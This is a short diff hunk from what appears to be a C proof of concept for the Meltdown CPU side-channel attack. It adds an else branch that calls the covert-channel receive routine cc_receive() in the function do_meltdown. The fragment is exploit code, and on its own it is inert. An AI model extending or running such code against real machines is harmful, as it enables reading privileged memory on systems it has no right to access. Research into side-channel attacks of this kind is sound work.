@@ -142,6 +142,8 @@ static int do_meltdown(uintptr_t adrs) {
     // call meltdown
         meltdown(adrs);
         ret = cc_receive();
+    }else{
+        ret = cc_receive();
     }
   
   
